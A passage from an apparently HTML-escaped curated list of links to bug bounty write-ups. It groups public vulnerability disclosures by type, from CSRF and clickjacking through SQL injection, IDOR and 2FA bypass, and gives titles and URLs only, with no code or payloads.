CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/stealing-access-token-of-one-drive-integration-by-chaining-csrf-vulnerability-779f999624a7&#34;&gt;Stealing access token of one drive integration by chain csrf vulnerability &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/metasploit-web-project-kill-all-running-tasks-csrf-cve-2017-5244/&#34;&gt;Metasploit web project kill all running taks CSRF CVE-2017-5244&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/messenger-site-wide-csrf/&#34;&gt;Messenger site wide CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.josipfranjkovic.com/blog/hacking-facebook-csrf-device-login-flow&#34;&gt;Hacking Facebook CSRF device login flow&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69&#34;&gt;Two vulnerabilities makes an exploit XSS and CSRF in bing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/blog.darabi.me/2016/05/how-i-bypassed-facebook-csrf-in-2016.html&#34;&gt;How I bypassed Facebook in 2016&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass/&#34;&gt;Ubiquiti bugbounty unifi generic CSRF protection Bypass &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.darabi.me/2015/04/bypass-facebook-csrf.html&#34;&gt;Bypass Facebook CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.josipfranjkovic.com/blog/facebook-csrf-full-account-takeover&#34;&gt;Facebook CSRF full account takeover&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Clickjacking (UI redressing attack)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://santuysec.com/2020/03/06/google-bug-bounty-clickjacking-on-google-payment-1337/&#34;&gt;Google Bug bounty Clickjacking on Google payment&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@godofdarkness.msf/google-apis-clickjacking-1337-7a3a9f3eb8df&#34;&gt;Google APIs Clickjacking worth 1337$&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/clickjacking-xss-on-google-org/&#34;&gt;Clickjacking + XSS on Google org&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40&#34;&gt;Bypass CSRF with clickjacking on Google org &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414&#34;&gt;1800 worth Clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/account-taker-with-clickjacking-ace744842ec3&#34;&gt;Account takeover with clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@abaykandotcom/clickjacking-on-google-cse-6636bba72d20&#34;&gt;Clickjacking on google CSE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://malfind.com/index.php/2018/12/21/how-i-accidentaly-found-clickjacking-in-facebook/&#34;&gt;How I accidentally found clickjacking in Facebook&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://apapedulimu.click/clickjacking-on-google-myaccount-worth-7500/&#34;&gt;Clickjacking on google myaccount worth 7500&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@raushanraj_65039/clickjacking-in-google-docs-and-voice-typing-feature-c481d00b020a&#34;&gt;Clickjacking in google docs and void typing feature&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0&#34;&gt;Reflected DOM XSS and Clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ameerassadi/binary-com-clickjacking-vulnerability-exploiting-html5-security-features-368c1ff2219d&#34;&gt;binary.com clickjacking vulnerability exploiting HTML5 security features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/&#34;&gt;12000 intersection betwen clickjacking XSS and denial of service&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html&#34;&gt;Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a&#34;&gt;Yet another Google Clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/redressing-instagram-leaking-application-tokens-via-instagram-clickjacking-vulnerability/&#34;&gt;Redressing instagram leaking application tokens via instagram clickjacking vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e&#34;&gt;Self XSS to Good XSS and Clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/microsoft-yammer-clickjacking-exploiting-html5-security-features/&#34;&gt;Microsoft Yammer clickjacking exploiting HTML5 security features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/firefox-find-my-device-service-clickjacking/&#34;&gt;Firefox find my device clickjacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/whatsapp-clickjacking-vulnerability-yet-another-web-client-failure/&#34;&gt;Whatsapp Clickjacking vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/telegram-web-client-clickjacking-vulnerability/&#34;&gt;Telegram WEB client clickjacking vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/write-ups/facebook-clickjacking-how-we-put-a-new-dress-on-facebook-ui/&#34;&gt;Facebook Clickjacking : how we put a new dress on facebook UI&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Local File Inclusion (LFI)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://hassankhanyusufzai.com/RFI_LFI_writeup/&#34;&gt;RFI LFI Writeup&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cyberzombie.in/my-first-lfi/&#34;&gt;My first LFI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vulnerabilitylabs/bug-bounty-lfi-at-google-com-3c2e17d8c912&#34;&gt;Bug bounty LFI at Google.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://omespino.com/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/&#34;&gt;Google LFI on production servers in redacted.google.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nirmaldahal.com.np/lfi-to-10-server-pwn/&#34;&gt;LFI to 10 server pwn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://offensi.com/2019/01/31/lfi-in-apigee-portals/&#34;&gt;LFI in apigee portals&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce&#34;&gt;Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d&#34;&gt;How we got LFI in apache drill recom like a boss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@logicbomb_1/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899&#34;&gt;Bugbounty journey from LFI to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6&#34;&gt;LFI to RCE on deutche telekom bugbounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/&#34;&gt;From LFI to RCE via PHP sessions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/&#34;&gt;magix bugbounty magix.com XSS RCE SQLI and LFI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.shashank.co/2013/10/lfi-in-nokia-maps.html&#34;&gt;LFI in nokia maps&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Subdomain Takeover&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/how-i-bought-my-way-to-subdomain-takeover-on-tokopedia-8c6697c85b4d&#34;&gt;How I bought my way to subdomain takeover on tokopedia&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://smaranchand.com.np/2019/12/subdomain-takeover-via-pantheon/&#34;&gt;Subdomain Takeover via pantheon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/11/subdomain-takeover-via.html&#34;&gt;Subdomain takeover : a unique way&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.takemyhand.xyz/2019/05/escalating-subdomain-takeovers-to-steal.html&#34;&gt;Escalating subdomain takeover to steal sensitive stuff&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/subdomain-takeover-awarded-200-8296f4abe1b0&#34;&gt;Subdomain takeover awarded 200&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/02/subdomain-takeover-via-wufoo-service-in.html&#34;&gt;Subdomain takeover via wufoo service&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/02/subdomain-takeover-via-hubspot.html&#34;&gt;Subdomain takeover via Hubspot&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/02/souqcom-subdomain-takeover-via.html&#34;&gt;Souq.com subdomain takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/subdomain-takeover-new-level-43f88b55e0b2&#34;&gt;Subdomain takeover : new level&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@prial261/subdomain-takeover-dew-to-missconfigured-project-settings-for-custom-domain-46e90e702969&#34;&gt;Subdomain takeover due to misconfigured project settings for custom domain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/10/subdomain-takeover-via-shopify-vendor.html&#34;&gt;Subdomain takeover via shopify vendor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/&#34;&gt;Subdomain takeover via unsecured s3 bucket&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@alirazzaq/subdomain-takeover-worth-200-ed73f0a58ffe&#34;&gt;Subdomain takeover worth 200&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/09/subdomain-takeover-via-campaignmonitor.html&#34;&gt;Subdomain takeover via campaignmonitor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@thebuckhacker/how-to-do-55-000-subdomain-takeover-in-a-blink-of-an-eye-a94954c3fc75&#34;&gt;How to do 55000 subdomain takeover in a blink of an eye&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0xpatrik.com/subdomain-takeover-starbucks-ii/&#34;&gt;Subdomain takeover Starbucks (Part 2)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0xpatrik.com/subdomain-takeover-starbucks/&#34;&gt;Subdomain takeover Starbucks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2017/11/20/uber-wildcard-subdomain-takeover&#34;&gt;Uber wildcard subdomain takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2017/10/10/bugcrowds-domain-subdomain-takeover-vulnerability&#34;&gt;Bugcrowd domain subdomain takeover vulnerability &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2017/10/10/subdomain-takeover-lamborghini-hacked/&#34;&gt;Subdomain takeover vulnerability (Lamborghini Hacked)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/&#34;&gt;Authentication bypass on uber&#39;s SSO via subdomain takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/&#34;&gt;Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Denial of Service (DOS)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0&#34;&gt;Long String DOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://kishanbagaria.com/airdos/&#34;&gt;AIRDOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pankajinfosec.com/post/700-denial-of-service-dos-vulnerability-in-script-loader-php-cve-2018-6389&#34;&gt;Denial of Service DOS vulnerability in script loader (CVE-2018-6389)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.teddykatz.com/2019/11/12/github-actions-dos.html&#34;&gt;Github actions DOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://evanricafort.blogspot.com/2019/08/application-level-denial-of-service-dos.html&#34;&gt;Application level denial of service&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/banner-grabbing-to-dos-and-memory-corruption-2442b1c25bbb&#34;&gt;Banner grabbing to DOS and memory corruption&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@maxpasqua/dos-across-facebook-endpoints-1d7d0bc27c7f&#34;&gt;DOS across Facebook endpoints&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2019/02/dos-on-waf-protected-sites-by-abusing.html&#34;&gt;DOS on WAF protected sites&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kankrale.rahul/dos-on-facebook-android-app-using-65530-characters-of-zero-width-no-break-space-db41ca8ded89&#34;&gt;DOS on Facebook android app using zero width no break characters &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pratheesh.p.narayanan/whatsapp-dos-vulnerability-on-android-ios-web-7628077d21d4&#34;&gt;Whatsapp DOS vulnerability on android and iOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/whatsapp-dos-vulnerability-in-ios-android-d896f76d3253&#34;&gt;Whatsapp DOS vulnerability in iOS android&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Authentication Bypass&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2&#34;&gt;Touch ID authentication Bypass on evernote and dropbox iOS apps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xpoc.pro/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect/&#34;&gt;Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gauravnarwani.com/two-factor-authentication-bypass/&#34;&gt;Two factor authentication bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1&#34;&gt;Instagram multi factor authentication bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402&#34;&gt;Authentication bypass in nodejs application&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://artkond.com/2018/10/10/symantec-authentication-bypass/&#34;&gt;Symantec authentication Bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.takemyhand.xyz/2018/06/authentication-bypass-in-cisco-meraki.html&#34;&gt;Authentication bypass in CISCO meraki&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html&#34;&gt;Slack SAML authentocation bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/&#34;&gt;Authentication bypass on UBER&#39;s SSO&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/&#34;&gt;Authentication Bypass on airbnb via oauth tokens theft&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/&#34;&gt;Inspect element leads to stripe account lockout authentication Bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/&#34;&gt;Authentication bypass on SSO ubnt.com&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;SQL Injection(SQLI)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html&#34;&gt;Tricky oracle SQLI situation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/&#34;&gt;Exploiting “Google BigQuery” SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@St00rm/sql-injection-via-stopping-the-redirection-to-a-login-page-52b0792d5592&#34;&gt;SQLI via stopping the redirection to a login page&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@frycos/finding-sql-injections-fast-with-white-box-analysis-a-recent-bug-example-ca449bce6c76&#34;&gt;Finding SQLI with white box analysis a recent bug example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://robinverton.de/blog/2019/08/25/bug-bounty-bypassing-a-crappy-waf-to-exploit-a-blind-sql-injection/&#34;&gt;Bypassing a crappy WAF to exploit a blind SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/07/sql-injection-in-private-sitecomloginphp.html&#34;&gt;SQL Injection in private-site.com/login.php&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.noob.ninja/2019/07/exploiting-tricky-blind-sql-injection.html&#34;&gt;Exploiting tricky blind SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kgaber99/sql-injection-in-forget-password-function-3c945512e3cb&#34;&gt;SQLI in forget password fucntion&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3&#34;&gt;SQLI Bug Bounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jspin.re/fileupload-blind-sqli/&#34;&gt;File Upload blind SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saadahmedx/sql-injection-c87a390afdd3&#34;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888&#34;&gt;SQLI through User Agent&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/&#34;&gt;SQLI in insert update query without comma&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@orthonviper/sql-injection-for-50-bounty-but-still-worth-reading-468442c1cc1a&#34;&gt;SQLI for 50 bounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vesiluoma.com/abusing-mysql-clients/&#34;&gt;Abusing MYSQL CLients&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/10/sqli-login-bypass-autotraders/&#34;&gt;SQLI Authentication Bypass AutoTrader Webmail&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/&#34;&gt;ZOL Zimbabwe Authentication Bypass to XSS &amp;amp; SQLi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/&#34;&gt;SQLI bootcamp.nutanix.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/sql-injection-vulnerability-in-university-of-cambridge-b4c8d0381e1&#34;&gt;SQLI in University of Cambridge&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8&#34;&gt;Making a blind SQLI a little less Blind SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html&#34;&gt;SQLI amd silly WAF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vishnu0002/attacking-postgresql-database-834a9a3471bc&#34;&gt;Attacking Postgresql Database&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@logicbomb_1/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610&#34;&gt;Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/a-five-minute-sql-i-16ab75b20fe4&#34;&gt;A 5 minute SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nuraalamdipu/union-based-sql-injection-write-up-a-private-company-site-273f89a49ed9&#34;&gt;Union based SQLI writeup&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2&#34;&gt;SQLI with load file and into outfile&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@agrawalsmart7/sql-is-every-where-5cba6ae9480a&#34;&gt;SQLI is Everywhere&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zombiehelp54.blogspot.com/2017/02/sql-injection-in-update-query-bug.html&#34;&gt;SQLI in Update Query Bug&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ahussam.me/Blind-sqli-Hootsuite/&#34;&gt;Blind SQLI Hootsuite&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/&#34;&gt;Yahoo – Root Access SQLI – tw.yahoo.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://josipfranjkovic.blogspot.com/2014/09/step-by-step-exploiting-sql-injection.html&#34;&gt;Step by Step Exploiting SQLI in Oculus&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/&#34;&gt;Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bitquark.co.uk/blog/2014/02/23/tesla_motors_blind_sql_injection&#34;&gt;Tesla Motors blind SQLI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html&#34;&gt;SQLI in Nokia Sites&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Insecure Direct Object Reference (IDOR)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugreader.com/jubabaghdad@disclose-private-dashboard-charts-name-and-data-in-facebook-analytics-184&#34;&gt;Disclose Private Dashboard Chart&#39;s name and data in Facebook Analytics&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugreader.com/rony@disclosing-privately-shared-gaming-clips-of-any-user-128&#34;&gt;Disclosing privately shared gaming clips of any user&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugreader.com/binit@adding-anyone-including-non-friend-and-blocked-people-as-co-host-in-personal-event-181&#34;&gt;Adding anyone including non-friend and blocked people as co-host in personal event!&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugreader.com/rony@page-analyst-could-view-job-application-details-213&#34;&gt;Page analyst could view job application details&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugreader.com/testgrounds@deleting-anyones-video-poll-175&#34;&gt;Deleting Anyone&#39;s Video Poll&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;2FA related issues&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jeppe.b.weikop/2fa-bypass-via-logical-rate-limiting-bypass-25ae2a4e1835&#34;&gt;2FA Bypass via logical rate limiting Bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3&#34;&gt;Bypass 2FA in a 